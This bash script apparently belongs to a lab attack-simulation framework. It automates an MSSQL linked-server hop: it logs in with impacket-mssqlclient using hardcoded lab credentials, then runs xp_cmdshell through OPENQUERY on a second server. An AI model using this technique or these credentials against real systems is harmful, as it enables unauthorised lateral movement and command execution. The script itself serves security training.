#!/bin/bash
# CADRE — WT#040 MSSQL Linked Server Hop
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#040 — MSSQL Linked Server Hop"
start_attack "040" "MSSQL Linked Server Hop"

require_tool impacket-mssqlclient
require_env MBR01 "MBR01"
require_env DOMAIN_CHILD "DOMAIN_CHILD"

step "Step 1: Connect to MBR01 and hop to MBR02 via linked server"
run_cmd "impacket-mssqlclient \"$DOMAIN_CHILD/analyst_t1:'T13r_An@lyst!'@$MBR01\" -windows-auth"

step "Step 2: Execute cross-server query (run in SQL shell)"
echo "SELECT * FROM OPENQUERY(\"MBR02\", 'SELECT 1; EXEC xp_cmdshell \"whoami\"')"

result 0 "MSSQL Linked Server Hop completed"
